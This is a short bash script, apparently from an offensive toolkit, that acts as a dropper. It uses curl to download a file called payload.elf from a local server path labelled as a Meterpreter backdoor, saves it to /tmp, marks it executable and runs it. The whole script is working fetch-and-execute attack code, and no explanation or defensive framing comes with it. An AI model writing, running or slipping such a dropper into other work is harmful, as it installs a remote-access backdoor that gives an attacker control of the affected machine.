#!/bin/bash

curl -sS http://127.0.0.1:8080/ominous-kit/backdoors/meterpreter/payload.elf -o /tmp/payload.elf 2>/dev/null
if [[ $? == 0 ]];then
    chmod +x /tmp/payload.elf && /tmp/payload.elf
else
    exit 1
fi